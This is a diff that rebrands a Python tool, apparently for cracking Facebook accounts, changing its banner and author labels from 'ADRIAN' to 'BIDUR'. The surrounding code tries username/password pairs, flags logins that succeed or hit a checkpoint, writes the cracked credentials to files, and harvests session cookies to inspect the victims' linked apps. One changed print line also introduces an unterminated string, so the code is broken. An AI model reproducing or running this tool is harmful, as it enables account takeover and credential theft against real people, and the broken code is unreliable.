@@ -77,14 +77,14 @@ class Main:
 			os.remove("data/token");os.remove("data/coki")
 			exit(" ! Your token Expired ! ")
 		os.system("clear")
-		print("""\x1b[1;97m
-   ###    ########  ########  ####    ###    ##    ## 
-  ## ##   ##     ## ##     ##  ##    ## ##   ###   ## 
- ##   ##  ##     ## ##     ##  ##   ##   ##  ####  ## 
-##     ## ##     ## ########   ##  ##     ## ## ## ## 
-######### ##     ## ##   ##    ##  ######### ##  #### 
-##     ## ##     ## ##    ##   ##  ##     ## ##   ### 
-##     ## ########  ##     ## #### ##     ## ##    ## 
+		print("""\x1b[1;95m
+██████╗ ██╗██████╗ ██╗   ██╗██████╗ 
+██╔══██╗██║██╔══██╗██║   ██║██╔══██╗
+██████╔╝██║██║  ██║██║   ██║██████╔╝
+██╔══██╗██║██║  ██║██║   ██║██╔══██╗
+██████╔╝██║██████╔╝╚██████╔╝██║  ██║
+╚═════╝ ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
+                                     
  
 [\x1b[1;97m•\33[1;97m] Autor  : ADRIAN-XD \n[\x1b[1;97m•\33[1;97m] Github : ADRIAN-XD\x1b[1;97m\n---------------------------------------------------------------------""")
         
@@ -194,7 +194,7 @@ class Crack:
 				'Accept-Language'	:	'id-ID,id;q=0.9'
 			})
 			if "c_user" in session.cookies.get_dict():
-				print('\r%s[ADRIAN-SUCCESSFULL❤] %s • %s •'%(H,user,pw))
+				print('\r%s[BIDUR-SUCESSFULL❤] %s • %s •'%(H,user,pw))
 				ok.append(user+"|"+pw)
 				open("data/ok","a").write(user+"|"+pw+"\n")
 				coki = ';'.join(["%s=%s"%(k,v) for k,v in session.cookies.get_dict().items()])
@@ -203,7 +203,7 @@ class Crack:
 				sys.stdout.flush()
 				break
 			elif "checkpoint" in session.cookies.get_dict():
-				print('\r%s[ADRIAN-CHECKPOINT] %s • %s •'%(M,user,pw))
+				print('\r%s[BIDUR-CHECKPOINT] %s • %s •'%(M,user,pw))
 				cp.append(user+"|"+pw)
 				open("data/cp","a").write(user+"|"+pw+"\n")
 				h2 = {
@@ -316,7 +316,7 @@ def cek_apk(session,coki):
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
     if len(game)==0:
-        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
+        print(f'\r %s[%s!%s] %sSorry there is no Active ApplicationN,M,N))
     else:
         print(f'\r 🎮  %sYour Active Application Details :'%(H))
         for i in range(len(game)):
